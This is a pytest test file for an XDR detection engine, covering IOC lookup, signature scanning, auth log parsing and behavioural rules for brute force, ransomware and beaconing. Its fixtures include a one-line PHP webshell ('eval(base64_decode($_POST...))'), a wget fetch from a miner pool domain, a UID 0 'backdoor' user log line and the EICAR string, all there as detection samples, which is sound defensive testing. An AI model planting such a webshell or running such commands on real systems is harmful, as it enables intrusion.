import os
import time

from conftest import ev
from xdr.detection.behavior import BehaviorEngine
from xdr.detection.correlation import CorrelationEngine
from xdr.detection.engine import DetectionEngine
from xdr.detection.intel import IntelStore
from xdr.detection.signatures import SignatureScanner
from xdr.config import DEFAULTS
from xdr.events import Alert
from xdr.storage import Storage
from xdr.collectors.auth import parse_auth_line

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


def test_intel_matching():
    store = IntelStore(DEFAULTS["detection"]["ioc_file"])
    assert store.lookup_hash("275A021BBFB6489E54D471899F7DB9D1663FC695EC2FE2A2C4538AABF651FD0F")
    store.add("cidrs", "192.0.2.0/24", "red maliciosa")
    assert store.lookup_ip("192.0.2.77") == "red maliciosa"
    assert store.lookup_domain("eu.pool.supportxmr.com")
    alerts = store.match_event(ev("process", "start", cmdline="wget http://sub.supportxmr.com/a"))
    assert alerts and alerts[0].rule_id == "IOC-DOMAIN"
    alerts = store.match_event(ev("network", "connection", remote_ip="198.51.100.66"))
    assert alerts[0].rule_id == "IOC-IP"


def test_signatures(tmp_path):
    scanner = SignatureScanner(DEFAULTS["detection"]["signatures_file"])
    f = tmp_path / "e.com"
    f.write_text(EICAR)
    assert any(r["signature"].id == "SIG-EICAR" for r in scanner.scan_file(str(f)))
    w = tmp_path / "s.php"
    w.write_text("<?php eval(base64_decode($_POST['x'])); ?>")
    assert any(r["signature"].id == "SIG-WEBSHELL-PHP" for r in scanner.scan_file(str(w)))
    clean = tmp_path / "ok.txt"
    clean.write_text("hola mundo")
    assert scanner.scan_file(str(clean)) == []
    alerts = scanner.match_event(ev("file", "create", path=str(w)))
    assert alerts[0].source == "signature"


def test_auth_parser():
    a, d = parse_auth_line("Jan 1 host sshd[1]: Failed password for invalid user oracle from 203.0.113.9 port 22 ssh2")
    assert a == "login_failed" and d["user"] == "oracle" and d["src_ip"] == "203.0.113.9"
    a, d = parse_auth_line("Jan 1 host sshd[1]: Accepted publickey for bob from 10.1.1.1 port 22 ssh2")
    assert a == "login_success" and d["src_private"] is True
    assert parse_auth_line("Jan 1 host sshd[1]: pam_unix(sshd:auth): authentication failure; rhost=1.1.1.1") is None
    a, d = parse_auth_line("Jan 1 host useradd[5]: new user: name=backdoor, UID=0, GID=0")
    assert a == "user_created" and d["uid"] == "0"


def test_bruteforce_and_success():
    be = BehaviorEngine(DEFAULTS["detection"])
    out = []
    for i in range(5):
        out += be.analyze(ev("auth", "login_failed", src_ip="203.0.113.5", user=f"u{i}", service="sshd"))
    rules = {a.rule_id for a in out}
    assert "BEH-BRUTEFORCE" in rules and "BEH-SPRAY" in rules
    succ = be.analyze(ev("auth", "login_success", src_ip="203.0.113.5", user="u1"))
    assert succ[0].rule_id == "BEH-BRUTEFORCE-SUCCESS" and succ[0].severity == "critical"


def test_ransomware_detection():
    be = BehaviorEngine(DEFAULTS["detection"])
    alerts = []
    for i in range(30):
        alerts += be.analyze(ev("file", "modify", zone="user", path=f"/home/a/doc{i}.txt", extension=".txt",
                                filename=f"doc{i}.txt", entropy=7.9, size=4096))
    assert [a for a in alerts if a.rule_id == "BEH-RANSOMWARE"]
    note = be.analyze(ev("file", "create", zone="user", path="/home/a/HOW_TO_DECRYPT.txt",
                         filename="HOW_TO_DECRYPT.txt", extension=".txt", entropy=4.0))
    assert note[0].rule_id == "BEH-RANSOM-NOTE" and note[0].severity == "critical"


def test_compressed_files_do_not_trigger_ransomware():
    be = BehaviorEngine(DEFAULTS["detection"])
    alerts = []
    for i in range(50):
        alerts += be.analyze(ev("file", "create", zone="user", path=f"/home/a/p{i}.jpg", extension=".jpg",
                                filename=f"p{i}.jpg", entropy=7.99, size=90000))
    assert not alerts


def test_beaconing():
    be = BehaviorEngine(DEFAULTS["detection"])
    alerts = []
    t0 = time.time()
    for i in range(8):
        e = ev("network", "connection", direction="outbound", remote_ip="93.184.216.34", remote_port=443,
               process="implant", remote_private=False)
        e.timestamp = t0 + i * 30 + (0.5 if i % 2 else 0)
        alerts += be.analyze(e)
    assert [a for a in alerts if a.rule_id == "BEH-BEACONING"]


def test_engine_dedup_and_allowlist(config):
    engine = DetectionEngine(config)
    e = ev("process", "start", name="xmrig", cmdline="xmrig", exe="/tmp/xmrig", pid=5)
    assert engine.analyze(e)
    assert not [a for a in engine.analyze(e) if a.rule_id == "PROC-009"]  # deduplicada
    config["detection"]["allowlist"]["processes"] = ["xmrig"]
    engine2 = DetectionEngine(config)
    assert engine2.analyze(e) == []


def test_correlation_killchain_and_multihost():
    st = Storage(":memory:")
    corr = CorrelationEngine(st)
    extra_all = []
    for tactic in ("initial-access", "execution", "persistence"):
        a = Alert(rule_id=f"R-{tactic}", title=tactic, severity="high", tactic=tactic, host="h1",
                  event={"data": {"src_ip": "203.0.113.50"}})
        st.add_alert(a)
        inc, extra = corr.process(a)
        extra_all += extra
    assert any(x.rule_id == "CORR-KILLCHAIN" for x in extra_all)
    assert inc["severity"] == "critical" and inc["title"].startswith("Ataque multi-etapa")
    b = Alert(rule_id="R-x", title="x", severity="medium", tactic="discovery", host="h2",
              event={"data": {"src_ip": "203.0.113.50"}})
    inc2, extra = corr.process(b)
    assert inc2["id"] == inc["id"] and set(inc2["hosts"]) == {"h1", "h2"}
    assert any(x.rule_id == "CORR-MULTIHOST" for x in extra)


def test_self_exclusion(config):
    """Los ficheros del propio XDR (IOCs, BD, cuarentena) no deben autodetectarse."""
    engine = DetectionEngine(config)
    os.makedirs(config["server"]["data_dir"], exist_ok=True)
    own = os.path.join(config["server"]["data_dir"], "iocs.json")
    with open(own, "w") as fh:
        fh.write(EICAR)
    assert engine.analyze(ev("file", "modify", path=own, zone="system")) == []
